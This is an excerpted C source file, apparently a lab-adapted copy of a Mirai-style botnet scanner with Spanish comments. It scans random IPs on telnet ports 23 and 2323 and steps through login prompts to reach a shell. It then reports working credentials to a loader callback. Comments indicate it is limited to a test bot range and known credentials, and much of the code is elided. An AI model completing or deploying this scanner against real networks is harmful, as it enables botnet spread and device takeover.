...
{
    printf("[scanner %d] Iniciando scanner...\n", getpid());
...
#ifdef DEBUG
    printf("[scanner %d] Scanner iniciado.\n", getpid());
#endif
...
#ifdef DEBUG
        printf("[scanner %d] Failed to initialize raw socket, cannot scan\n", getpid());
#endif
        exit(0);
    }
...
#ifdef DEBUG
        printf("[scanner %d] Failed to set IP_HDRINCL, cannot scan\n", getpid());
#endif
        close(rsck);
        exit(0);
    }
...
#ifdef DEBUG
    printf("[scanner %d] Scanner process initialized. Scanning started.\n", getpid());
#endif
    ...
    while (TRUE) {
        ...
        if (fake_time != last_spew) {
            ...
            for (i = 0; i < SCANNER_RAW_PPS; i++) {
                ...
                struct in_addr addr;
                addr.s_addr = (uint32_t)iph->daddr;

                if (i % 10 == 0) {
                    tcph->dest = htons(2323);
                    //printf("[scanner %d] [fd %d] Trying host %s:%d...\n", getpid(), conn->fd, inet_ntoa(addr), 2323);
                } else {
                    tcph->dest = htons(23);
                    //printf("[scanner %d] [fd %d] Trying host %s:%d...\n", getpid(), conn->fd, inet_ntoa(addr), 23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
...
#ifdef DEBUG
            printf("[scanner %d] [fd %d] Attempting to brute found IP %d.%d.%d.%d\n", getpid(), conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }
            ...
            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout) {
#ifdef DEBUG
                printf("[scanner %d] [fd %d] timed out (state = %d)\n", getpid(), conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;
                ...
                if (conn->state > SC_HANDLE_IACS) {
                    if (++(conn->tries) == 10) {
                        ...
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner %d] [fd %d] retrying with different auth combo!\n", getpid(), conn->fd);
#endif
                    }
                } else {
                    conn->tries = 0;
        ...
        for (i = 0; i < SCANNER_MAX_CONNS; i++) {
...
#ifdef DEBUG
                    printf("[scanner %d] [fd %d] Connected. Trying %s:%s\n", getpid(), conn->fd, conn->auth->username, conn->auth->password);
#endif
                    conn->state = SC_HANDLE_IACS;
                    conn->rdbuf_pos = 0;
                } else {
#ifdef DEBUG
                    printf("[scanner %d] [fd %d] Error while connecting = %d\n", getpid(), conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
            ...
            if (FD_ISSET(conn->fd, &fdset_rd)) {
                while (TRUE) {
                    ...
                    if (ret == 0) {
#ifdef DEBUG
                        printf("[scanner %d] [fd %d] connection gracefully closed\n", getpid(), conn->fd);
#endif
                        errno = ECONNRESET;
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] lost connection\n", getpid(), conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;
                    ...
                    while (TRUE) {
                        ...
                        case SC_HANDLE_IACS:
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_HANDLE_IACS\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_USERNAME\n", getpid(), conn->fd);
#endif
                            if (conn->rdbuf[0] == TELNET_IAC){
                                if ((consumed = consume_iacs(conn)) > 0) {
                                    conn->state = SC_WAITING_USERNAME;
                                    break;
                                }
                                printf("Could not consume IAC!\n");
                                abort();
                            }

                            if ((consumed = consume_user_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received username prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] Username prompt not received!\n", getpid(), conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_PASSWORD\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_pass_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received password prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_PASSWD_RESP\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_any_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received shell (enable) prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_ENABLE_RESP\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_any_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received shell (system) prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_SYSTEM_RESP\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_any_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received shell (shell) prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_SHELL_RESP\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_any_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received shell (sh) prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_SH_RESP\n", getpid(), conn->fd);
#endif
                            if ((consumed = consume_any_prompt(conn)) > 0) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] received shell prompt\n", getpid(), conn->fd);
#endif
...
#ifdef DEBUG
                            printf("[scanner %d] [fd %d] SC_WAITING_TOKEN_RESP\n", getpid(), conn->fd);
#endif
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1) {
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] invalid username/password combo\n", getpid(), conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
...
#ifdef DEBUG
                                printf("[scanner %d] [fd %d] Found verified working telnet\n", getpid(), conn->fd);
#endif
                                char *tmp_str;
                                int tmp_len;
...
#ifdef DEBUG
                        printf("[scanner %d] [fd %d] bytes consumed: %d\n", getpid(), conn->fd, consumed);
#endif
                        ...
                        if (conn->rdbuf_pos > 8196) {
                            printf("[scanner %d] [fd %d] oversized buffer!\n", getpid(), conn->fd);
                            abort();
                        }
...
#ifdef DEBUG
        printf("[scanner %d] [fd %d] Failed to call socket()\n", getpid(), conn->fd);
#endif
        return;
    }
...
static ipv4_t get_random_ip(void)
{
    ...
    do {
        ...
        (o4 == 1) // Nos aseguramos de que el primer bot nunca es válido
        // (o1 != 172 && o2 != 20 && o3 != 1) // 172.20.1.0/24 - Rango de los bots
    /*
...
static int consume_iacs(struct scanner_connection *conn)
{
    ...
    while (1) {
        ...
        if (ptr[idx] == TELNET_IAC) {
            ...
            if (ptr[idx+1] == TELNET_DO && ptr[idx+2] == TELNET_ENCRYPT) {
                skip = 6;
            }

            for (i = 0; i < 3; i++) {
                if (ptr[idx+i] == TELNET_DO)
                    ptr[idx+i] = TELNET_WONT;
                else if (ptr[idx+i] == TELNET_WILL)
                    ptr[idx+i] = TELNET_DONT;
                send_buffer[idx+i] = ptr[idx+i];
            }
    ...
    if (idx > 0) {
        send(conn->fd, send_buffer, idx, MSG_NOSIGNAL);
    }
...
{
    // devolvemos únicamente las credenciales que ya sabemos que son válidas
    // en un sistema normal, se probarían todas las combinaciones disponibles
    return &auth_table[3]; // XXX
...
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    ...
    {
#ifdef DEBUG
        printf("[report %d] Failed to call socket()\n", getpid());
#endif
        exit(0);
    }
    ...
    {
#ifdef DEBUG
        printf("[report %d] Failed to resolve report address\n", getpid());
#endif
        return;
    }
    addr.sin_family = AF_INET;
    ...
    {
#ifdef DEBUG
        printf("[report %d] Failed to connect to scanner callback!\n", getpid());
#endif
        close(fd);
        exit(0);
    }
    ...
    printf("[report %d] Scan result sent to loader.\n", getpid());
